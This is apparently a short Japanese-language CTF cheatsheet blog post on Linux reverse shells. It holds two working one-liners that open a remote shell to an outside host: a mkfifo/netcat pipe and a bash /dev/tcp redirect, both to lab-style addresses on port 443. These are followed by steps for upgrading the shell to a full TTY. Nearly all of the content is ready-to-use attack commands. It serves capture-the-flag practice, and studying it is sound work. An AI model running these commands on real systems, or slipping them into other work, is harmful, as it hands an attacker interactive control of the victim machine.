---
layout: post
title: "linux_reverse_shell"
published : true
tags: CTF Common cheatsheet linux "reverse shell"
---
## リバースシェル
コマンド1
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 443 >/tmp/f
```
コマンド2
```sh
bash -i >& /dev/tcp/10.10.14.14/443 0>&1
```
## シェルのアップグレード(script)
```sh
script /dev/null -c bash
```
## シェルのアップグレード(python)
```sh
python -c 'import pty;pty.spawn("/bin/bash")'
```
## シェルをさらにアップグレード
```sh
(Ctrl + z)
stty raw -echo ; fg
```
